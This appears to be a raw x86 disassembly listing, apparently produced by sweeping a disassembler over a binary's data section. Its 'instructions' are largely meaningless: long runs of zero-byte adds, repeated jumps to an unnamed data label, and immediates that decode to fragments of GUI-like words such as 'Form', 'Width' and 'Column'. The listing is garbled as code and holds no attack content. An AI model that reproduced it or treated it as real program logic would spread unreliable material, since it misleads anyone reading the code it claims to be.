imul ebp [ esi + 0x74 ] 0x5064630a
jb r-xdata
jb r-xdata
push edx
jae r-xdata
dec edi
outsb
sbb al 0xa3
stosb [ edi ]
add edx eax
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090034 ] al
outsb
dec ebp
outsd
jne r-xdata
shl [ eax + 0x43 ] 0xad
add eax [ ebx ]
add ch [ esi ]
cmp [ ecx ] eax
jb r-xdata
push ebx
je r-xdata
add eax [ eax ]
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0038 ] al
outsb
popad
add eax [ eax ]
add [ eax ] al
adc [ ebx - 0x53 ] al
jpe r-xdata
dec edi
add edi [ eax ]
add [ eax ] eax
or cl [ edi + 0x6e ]
sub [ ebx ] 0x0
add esi [ eax + 0x2 ]
add bh bh
jo r-xdata
add [ eax ] al
add [ eax + 0x4f09002c ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x68 ] bp
cmpsb [ esi ] [ edi ]
stosb [ edi ]
add ecx [ eax ]
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsd [ edi ] [ esi ]
stosb [ edi ]
add esp eax
add [ eax ] al
jmp eax
jne r-xdata
inc ebp
jb r-xdata
jae r-xdata
inc esp
outsd
arpl [ ebx + 0x20 ] bp
cmpsb [ esi ] [ edi ]
stosb [ edi ]
push ebp
jo r-xdata
dec ecx
jb r-xdata
add ecx [ ebx ]
arpl [ ebx + esi * 2 + 0x53 ] sp
inc esp
jb r-xdata
or ah [ ebx + 0x64 ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0037 ] al
outsb
push ebx
je r-xdata
sub [ eax + 0xf003aa ] ch
add bh bh
[ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : esi ] al
add bh bh
je r-xdata
jae r-xdata
or ah [ fs : ebx + 0x64 ]
arpl [ ebp + 0x73 ] si
jae r-xdata
popad
jb r-xdata
inc ebp
jb r-xdata
inc esp
jb r-xdata
fxsave [ ebx ]
lodsb [ esi ]
fxsave [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax 0x6e4f0b00
cmp ebp [ ebp - 0x51f067fd ]
add ebp [ edi + ecx + 0x103ae ]
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
jb r-xdata
adc [ ebx + eax * 2 + 0x75 ] dl
jns r-xdata
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] al
insb
inc ebx
lodsd [ esi ]
add eax [ edx ]
cmp [ cs : ecx ] eax
adc al 0x43
lodsd [ esi ]
add eax [ ebx ]
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
je r-xdata
popa
or al 0x70
outsd
outsb
push es
arpl [ ebx + esi * 2 + 0x44 ] sp
or esp [ ebx + 0x64 ]
push eax
outsd
jae r-xdata
adc [ fs : ebx + 0x64 ] ah
jne r-xdata
popad
jae r-xdata
inc ebp
lodsd [ esi ]
add ebp [ eax + 0x2 ]
insb
jae r-xdata
inc eax
add [ esp + eax * 2 - 0x53 ] dl
add eax [ ebx ]
imul ebp [ esi + 0x61 ] 0x43086574
outsd
insd
inc ebx
bound ecx [ eax + 0x6f ]
jb r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x44 ] dl
lodsd [ esi ]
add ecx [ eax + esi * 2 ]
outsd
insd
inc esp
jb r-xdata
or esp [ fs : ebx + 0x64 ]
jae r-xdata
jae r-xdata
outsd
insd
inc esp
jb r-xdata
outsb
je r-xdata
je r-xdata
jae r-xdata
push es
je r-xdata
inc ecx
stosd [ edi ]
add edx eax
stosb [ edi ]
stosd [ edi ]
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
popad
je r-xdata
mov bl 0xaa
add esi eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ ebp - 0x53 ] 0x3
push 0xec000002
inc edx
outsd
je r-xdata
add [ esp + eax * 2 ] cl
lodsd [ esi ]
add eax [ esi ]
jae r-xdata
outsb
jae r-xdata
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
stosd [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ ebx + ebp ]
stosd [ edi ]
add ecx [ edx + edi * 2 ]
stosd [ edi ]
add ebp [ eax - 0x53fc5515 ]
jmp r-xdata
je r-xdata
cmp eax 0x45d403a8
jb r-xdata
inc edx
popad
insb
jae r-xdata
jb r-xdata
ja r-xdata
insd
imul esi [ ebx + 0x61 ] 0x64656c62
or ah [ ebx + 0x64 ]
jae r-xdata
or esp [ ebx + 0x64 ]
jae r-xdata
ja r-xdata
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
aam 0x45
je r-xdata
outsd
outsb
add [ eax ] eax
add ebp [ ebx + eax * 2 - 0x53 ]
add edx [ eax + r-xdata ]
add ecx [ ecx ]
push esp
push ebx
outsd
or [ ebx + 0x64 ] esp
jae r-xdata
arpl [ ebx + esi * 2 + 0x48 ] sp
cmpsd [ esi ] [ edi ]
add esp [ ebx ]
stosd [ edi ]
add eax [ esp + edi ]
stosd [ edi ]
add ebp eax
sub al 0xab
add esi [ eax - 0x7 ]
outsb
je r-xdata
je r-xdata
push es
jae r-xdata
aam 0x45
lodsd [ esi ]
add eax [ eax ]
add eax [ eax ]
dec esi
jb r-xdata
or [ ebx + edx * 2 + 0x6f ] edx
outsd
je r-xdata
insb
jae r-xdata
add ebp esp
sub ebp [ ebx - 0x547767fd ]
add [ eax ] al
in al dx
jae r-xdata
add [ eax ] al
jb r-xdata
hlt
pop ss
push esp
push eax
jb r-xdata
je r-xdata
push 0x656b6365
or ah [ fs : ebx + 0x64 ]
jae r-xdata
insb
arpl [ gs : ebp + 0x64 ] si
or [ ebx + 0x64 ] esp
jae r-xdata
je r-xdata
fadd [ ebp - 0x5a ]
add ebp [ edx + edx * 2 ]
jb r-xdata
push esp
jns r-xdata
add [ eax ] al
add [ ebx ] al
add [ eax ] al
jae r-xdata
adc [ ebx + 0x64 ] ah
arpl [ ebx + esi * 2 + 0x4d ] sp
add ebx [ eax - 0x13fc5478 ]
insb
or dh [ eax + 0x62 ]
add ebp [ eax - 0x14 ]
stosb [ edi ]
add eax [ eax - 0x5ffc5483 ]
jge r-xdata
add esp esp
cmp ch [ eax - 0x57c1effd ]
add eax [ eax ]
xchg ebx eax
lodsd [ esi ]
add edi [ edx + eax * 4 - 0x7737fc55 ]
stosd [ edi ]
add edx [ eax + ecx * 4 ]
stosd [ edi ]
insb
jae r-xdata
inc ebp
push esp
js r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
test al 0x3
jae r-xdata
outsd
push ebx
add ecx [ edx ]
arpl [ eax + edx * 2 + 0x72 ] sp
push eax
popad
imul ebp [ esi + 0x74 ] 0x5064630b
outsd
jae r-xdata
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] dl
inc ebx
lodsd [ esi ]
stosb [ edi ]
add ecx [ eax ]
test al 0x3
in al dx
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
add [ ebx - 0x7d43fc53 ] dl
stosd [ edi ]
add ecx eax
mov [ ebx - 0x5477ebfd ] ch
imul esp [ ebx + 0x61 ] 0x6f43086c
insd
inc ebx
push esi
add [ gs : eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
call r--data
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
push es
sub_3ad483f
push ebx
je r-xdata
push ebx
je r-xdata
jo r-xdata
outsd
jo r-xdata
jo r-xdata
adc [ esi + 0x8d03 ] ah
add [ eax ] al
add [ eax + 0x4f090024 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x68 ] bp
cmpsb [ esi ] [ edi ]
stosb [ edi ]
add ecx [ eax ]
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090025 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
movsd [ edi ] [ esi ]
stosb [ edi ]
add esp eax
add [ eax ] al
jmp eax
adc [ esi + 0x5703 ] ah
[ eax - 0x1bfc5506 ]
dec ebp
cld
jne r-xdata
dec ebp
outsd
jne r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
and [ ebx ] 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
add esi eax
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsd
arpl [ ebx + 0x20 ] bp
cmpsb [ esi ] [ edi ]
stosb [ edi ]
dec esp
popad
jbe r-xdata
sub eax [ eax ]
or al 0x4f
sbb al 0xa3
stosb [ edi ]
add eax eax
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0029 ] al
add [ eax + 0x4f070026 ] al
add [ eax ] al
dec edi
jbe r-xdata
outsb
dec ebp
outsd
jne r-xdata
add [ ebx ] cl
dec edi
jb r-xdata
jb r-xdata
jb r-xdata
dec edi
xchg esp eax
mov [ 0xc803aa ] eax
add bh bh
enter 0x0 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
jae r-xdata
inc esp
outsd
ja r-xdata
outsb
inc ebp
outsb
jb r-xdata
je r-xdata
jne r-xdata
aam 0x45
imul ebp [ edi + 0x6e ] r-xdata
push cs
outsd
outsb
inc esi
outsd
jb r-xdata
inc esp
jb r-xdata
fadd [ ebp - 0x5a ]
jb r-xdata
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
popad
dec ebp
push ebx
je r-xdata
sub [ edi ] 0x0
or ecx [ edi + 0x6e ]
outsd
jbe r-xdata
dec ebp
cld
jne r-xdata
cmpsb [ esi ] [ edi ]
stosb [ edi ]
add edi eax
add [ eax ] al
add edi eax
add [ eax ] eax
add [ eax - 0x80000000 ] al
add al [ eax ]
pop es
inc ebx
inc ebx
outsd
insb
jne r-xdata
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebp
jb r-xdata
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + ebx * 4 ]
lodsd [ esi ]
popad
je r-xdata
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
outsb
dec ebx
lodsd [ esi ]
add ecx [ esi ]
nop
dec esp
dec ebx
lodsd [ esi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ecx * 2 - 0x53 ] dl
push ds
dec esp
lodsd [ esi ]
add esi [ eax ]
add [ eax ] al
add [ esi + edi * 2 ] dh
cmpsd [ esi ] [ edi ]
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
jb r-xdata
cmpsb [ esi ] [ edi ]
add ebx [ edi + edx * 4 - 0x53 ]
add esi [ eax - 0x69 ]
lodsd [ esi ]
add ecx [ ebx ]
push esp
inc ebx
outsd
outsb
jbe r-xdata
inc ebx
inc esp
outsb
dec edi
sbb al 0xa3
stosb [ edi ]
add edx eax
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002d ] al
outsb
dec ebp
dec edi
outsb
inc ebp
js r-xdata
add edi [ eax ]
add [ eax ] eax
add bh bh
sub al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ ebx ] al
push esp
popad
mov [ bp + di - 0x53 ] cl
add ebx [ ebx + ebx * 4 - 0x63e3fc53 ]
lodsd [ esi ]
add edx [ esp + ebx * 4 ]
lodsd [ esi ]
add eax [ eax ]
add [ eax ] al
xor [ edx ] 0x0
add [ eax ] al
imul ebp [ edi + 0x6e ] r-xdata
sbb al 0x0
add bh bh
mov ah 0x9c
lodsd [ esi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add [ eax ] al
outsb
in al dx
inc ebx
imul ebp [ edi + 0x6e ] 0x6d726f46
add [ eax ] al
add [ eax + r-xdata ] dl
add [ esi ] eax
push esp
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0xfffffe04
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x403a6 ] dl
add [ eax ] al
nop
mov [ ebx - 0x53 ] cs
add eax [ ecx ]
push es
add eax [ eax + eax ]
add [ eax ] al
rcl [ eax ] 0xa6
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
push ebp
sub al [ eax ]
or al 0x4f
outsb
dec ebp
outsd
jne r-xdata
je r-xdata
add esi [ ebx + ebp * 4 - 0x6757fc59 ]
lodsd [ esi ]
add esp esp
pushfd
lodsd [ esi ]
add ebx [ eax - 0x63 ]
lodsd [ esi ]
add esi [ edi + ebp * 4 - 0x6547fc59 ]
lodsd [ esi ]
add ebx esp
add ecx [ eax ]
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
add eax [ eax ]
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002f ] al
outsb
push ebx
je r-xdata
test al 0xaa
add esi eax
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002e ] al
jae r-xdata
inc ebp
outsb
push es
outsd
jne r-xdata
mov [ 0x12803aa ] eax
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
cmovg ebp [ esi + 0x4d ]
add [ eax ] al
push [ esp + ebx * 4 + 0x103ad ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add eax [ eax ]
or cl [ ecx + 0x6d ]
popad
dec ecx
outsb
js r-xdata
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
dec ebx
lodsd [ esi ]
jo r-xdata
push ebp
outsd
jne r-xdata
sub [ 0x6e4f0900 ] 0x4d
jb r-xdata
add [ eax ] al
add [ ecx ] cl
inc ecx
insb
dec ebx
lodsd [ esi ]
add edx [ eax + eax ]
add bh bh
les ebx [ ebp + ebp * 4 + 0x103 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
or [ ebp + 0x61 ] cl
js r-xdata
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] dl
cmpsb [ esi ] [ edi ]
add ecx [ 0xffffffff80ff0000 ]
pushfd
lodsd [ esi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
or [ ecx + 0x75 ] al
je r-xdata
dec [ eax - 0x64 ]
add al ch
jae r-xdata
je r-xdata
jne r-xdata
dec ebx
lodsd [ esi ]
add ebx [ eax ]
add [ eax ] al
call esp
pushfd
push ebx
imul edi [ edx + 0x65 ] r-xdata
adc [ eax ] al
add bh bh
je r-xdata
pop es
add [ 0x74646957 ] al
push r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
add [ eax + 0x32 ] al
lodsd [ esi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x694d0800
outsb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
sub al 0x0
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
sbb [ eax ] al
add bh bh
aam 0x9c
scasd [ edi ]
cmpsd [ esi ] [ edi ]
add eax [ edi + edx * 4 + 0xe03ad ]
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ esi + 0x1003 ] ah
add [ ebx ] cl
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x756c6f43
insd
outsb
mov eax eax
xor [ ebp + ebp * 4 + 0x3 ] cl
pop es
or edx [ esp + ecx * 2 + 0x69 ]
jae r-xdata
mov ah 0xaf
cmpsd [ esi ] [ edi ]
add edi [ eax - 0x23fc5266 ]
lodsd [ esi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
or [ ecx + 0x6c ] eax
add ecx [ eax + eax ]
add bh bh
dec eax
pushfd
outsb
add esi [ eax ]
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002b ] al
dec ebx
lodsd [ esi ]
add eax eax
jle r-xdata
popad
jo r-xdata
lodsd [ esi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070002 ] al
sub_3ad7204
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
jb r-xdata
mov al 0xe5
stosb [ edi ]
add esp [ eax + ebp * 8 - 0x56 ]
add ecx [ eax - 0x3bfc5518 ]
jmp 0x36e1757c
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2803ad72 ] al
add [ eax ] al
add [ eax + 0x15 ] al
lodsd [ esi ]
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebp [ eax - 0x52 ]
cmpsd [ esi ] [ edi ]
add esi [ ebx + ebp * 4 - 0x5443fc59 ]
cmpsd [ esi ] [ edi ]
add esp [ edi + edi * 8 - 0x53 ]
add ecx [ edi - 0x53 ]
add esi [ edi + ebp * 4 + 0x7003a7 ]
scasb [ edi ]
add esp [ eax ]
add [ esi - 0x52d8effd ] ch
add edi [ eax - 0x13fc5201 ]
[ ebp - 0x51ffbffd ]
sub_3ad7277
add ecx [ eax + eax + 0xa803ae ]
scasb [ edi ]
add ecx [ esp + edx * 2 ]
inc ebx
outsd
insd
bound ebp [ edi + 0x45 ]
js r-xdata
outsb
outsb
je r-xdata
je r-xdata
outsb
js r-xdata
out 0xab eax
add esp [ eax ]
add [ eax ] al
[ eax + eax ]
add [ ecx ] dl
dec edi
insd
lea eax [ eax ]
xchg esp eax
jb r-xdata
and al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add al [ eax ]
push es
dec ecx
inc eax
add [ eax + 0x3ad73 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
jae r-xdata
add [ eax ] bl
pop ss
lodsd [ esi ]
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
jb r-xdata
sbb [ ebx - 0x5a ] al
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebp [ eax - 0x52 ]
cmpsd [ esi ] [ edi ]
add esi [ ebx + ebp * 4 - 0x5443fc59 ]
add eax [ edi ]
or al 0x54
inc ebx
outsd
insd
bound ebp [ edi + 0x45 ]
js r-xdata
jbe r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2803ad73 ] dh
add [ eax ] al
add [ eax ] al
add [ esp + esi * 2 + 0x2003ad ] bh
add [ eax ] al
xchg esp eax
test eax 0xa645c803
add edx esp
inc ebp
je r-xdata
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp [ eax - 0x50 ]
cmpsd [ esi ] [ edi ]
add esi [ ebx + ebp * 4 - 0x5443fc59 ]
cmpsd [ esi ] [ edi ]
add ecx esp
mov al 0xa7
aam 0x45
popad
jns r-xdata
add [ eax ] al
add [ eax - 0x1 ] al
add eax [ eax ]
adc [ edi + 0x76 ] ecx
jb r-xdata
je r-xdata
inc edx
js r-xdata
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp eax
adc [ esi - 0x58544bfd ] ch
insd
jae r-xdata
les esi [ ebx - 0x53 ]
insd
popad
dec ecx
outsb
js r-xdata
stosd [ edi ]
insd
dec esp
jb r-xdata
lea eax [ eax ]
pop esp
jne r-xdata
js r-xdata
add [ eax ] al
add [ eax ] al
jne r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol ah 0x73
lodsd [ esi ]
add eax [ edi ]
or eax 0x6d6f4354
bound ebp [ edi + 0x45 ]
js r-xdata
add ebx [ eax + eax ]
add bh bh
xor [ eax ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add al 0x0
adc dl [ ebx + 0x65 ]
insb
arpl [ gs : ebp + 0x64 ] si
dec ecx
out 0xab eax
cmpsd [ esi ] [ edi ]
add esp [ edi + edi * 8 - 0x53 ]
add ecx [ edi - 0x53 ]
add esi [ edi + ebp * 4 + 0x7003a7 ]
scasb [ edi ]
add esp [ eax ]
add [ esi - 0x52d8effd ] ch
add edi [ eax - 0x13fc5201 ]
[ ebp - 0x51ffbffd ]
add ebx esp
adc eax 0x503ad
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
outsd
js r-xdata
outsd
add eax [ ebx ]
adc dl [ ebx + eax * 2 + 0x6f ]
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
je r-xdata
nop
aam 0x74
add ecx [ ebx ]
jae r-xdata
lodsd [ esi ]
add eax [ edi ]
adc dl [ ebx + eax * 2 + 0x6f ]
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
imul ebp [ esi + 0x67 ] 0x74d49073
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
aam 0x45
je r-xdata
insd
popad
dec ecx
dec ecx
insb
jae r-xdata
dec ecx
js r-xdata
jbe r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
jae r-xdata
js r-xdata
insb
js r-xdata
jae r-xdata
js r-xdata
add eax [ eax + edi * 4 ]
cmpsd [ esi ] [ edi ]
add ebx esp
mov dh 0xa7
add ebp [ eax + 0x12 ]
scasb [ edi ]
add ecx [ edx + edx + 0x129803ae ]
scasb [ edi ]
add esp [ edx + edx - 0x4513fc52 ]
cmpsd [ esi ] [ edi ]
add ebx [ eax - 0x63fc5841 ]
adc ebp [ esi - 0x583ecbfd ]
cmpsd [ esi ] [ edi ]
insd
jae r-xdata
cmpsb [ esi ] [ edi ]
add esp [ eax + eax ]
add bh bh
add [ eax + edx ] bh
adc [ ebx + 0x73 ] esp
inc ebp
arpl [ ebx + 0x45 ] si
js r-xdata
imul edi [ edx + 0x65 ] 0x696d694c
je r-xdata
je r-xdata
insb
packsswb mm6 [ ebx + 0x45 ]
push ebx
je r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
pop eax
jne r-xdata
add [ eax ] al
add [ eax ] al
add al 0x0
inc ebp
js r-xdata
jb r-xdata
outsd
inc edx
push ebx
outsb
push ebx
jb r-xdata
mov al 0x73
lodsd [ esi ]
add ebp [ eax ]
jae r-xdata
add [ eax ] al
add ah bh
popad
je r-xdata
insd
jo r-xdata
outsd
push ebx
or [ ebx + 0x6f ] al
js r-xdata
arpl [ ebx + 0x45 ] si
outsd
js r-xdata
adc [ ebx + eax * 2 + 0x6f ] edx
insd
bound ebp [ edi + 0x42 ]
jne r-xdata
pop eax
add eax [ esi ]
outsd
inc ebp
imul esi [ fs : ecx + ecx * 2 + 0x6d ] 0x15656761
arpl [ ebx + 0x45 ] si
js r-xdata
inc eax
add [ ebp + esi * 2 - 0x53 ] bl
imul ebp [ esi + 0x67 ] 0xad743473
add edx [ ecx ]
arpl [ ebx + 0x45 ] si
js r-xdata
outsb
outsb
dec ecx
insd
popad
adc eax 0x78457363
jo r-xdata
inc ecx
js r-xdata
je r-xdata
je r-xdata
outsb
jo r-xdata
add edi [ eax ]
mov ch 0xa7
add edi [ esi * 4 + 0x18403a7 ]
scasb [ edi ]
add esi esp
mov ah 0xa7
add edi eax
mov ah 0xa7
add esp [ ecx + esi * 4 - 0x59 ]
add esp eax
mov cl 0xa7
add ebx [ eax + ebp ]
add edi [ ebx + ebp * 4 - 0x4f33fc59 ]
cmpsd [ esi ] [ edi ]
add esp [ edi + edx + 0x303ad ]
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
push edi
outsd
jb r-xdata
add ecx [ esi ]
popad
arpl [ edi + 0x41 ] bp
jne r-xdata
jne r-xdata
imul esi [ ebx + 0x74 ] 0x6f63610d
push edx
je r-xdata
je r-xdata
insb
jae r-xdata
imul esi [ ecx + ecx * 2 + 0x6d ] 0x49656761
add eax [ eax ]
jbe r-xdata
jns r-xdata
outsd
inc ebp
imul esi [ fs : ecx + ecx * 2 + 0x6d ] 0x49656761
jns r-xdata
insb
jae r-xdata
popad
outsd
ja r-xdata
outsb
jae r-xdata
outsd
inc ecx
popad
je r-xdata
jae r-xdata
jae r-xdata
outsd
ja r-xdata
add edi [ ecx + eax * 8 + 0x13bc03a7 ]
scasb [ edi ]
add ecx [ eax - 0x3c ]
cmpsd [ esi ] [ edi ]
add ecx eax
fxsave [ ebx ]
in al dx
fxsave [ ebx ]
and al 0xb6
cmpsd [ esi ] [ edi ]
add ebx [ eax + edx ]
scasb [ edi ]
add edx [ eax ]
adc [ esi - 0x51eee3fd ] ebp
add ebx [ eax - 0x43fc5846 ]
adc ch [ esi - 0x51ec9ffd ]
add eax [ ebp + edi * 4 + 0x136803a7 ]
scasb [ edi ]
add edi [ eax - 0x17fc5843 ]
cmpsd [ esi ] [ edi ]
add ebx [ ebx + edx - 0x3ecbfc52 ]
cmpsd [ esi ] [ edi ]
insb
jae r-xdata
inc edx
jb r-xdata
je r-xdata
outsd
push ebx
jne r-xdata
cmpsb [ esi ] [ edi ]
push edx
popad
imul ebp [ fs : esi + 0x67 ] 0x6d6f4308
outsd
dec edi
jo r-xdata
add eax [ eax ]
add [ eax ] al
jb r-xdata
jne r-xdata
popad
add eax [ ebx ]
adc edx [ ecx + eax * 2 + 0x75 ]
je r-xdata
push esp
jae r-xdata
insd
inc ebx
je r-xdata
outsd
insd
bound ebp [ edi + 0x42 ]
add [ ebp + 0x75040040 ] cl
lodsd [ esi ]
add eax [ ebx ]
adc [ ebx + eax * 2 + 0x6f ] dl
dec esi
adc eax 0x78457363
or ah [ ebx + 0x73 ]
inc ebp
js r-xdata
jne r-xdata
cld
jb r-xdata
outsb
or [ fs : ecx + 0x63 ] esp
outsd
push ebx
outsd
push 0x6f636111
inc esi
imul ebp [ esp + esi * 2 + 0x65 ] 0x65725072
ja r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d6f4308
add [ esp + esi * 2 ] dh
lodsd [ esi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
je r-xdata
jo r-xdata
popad
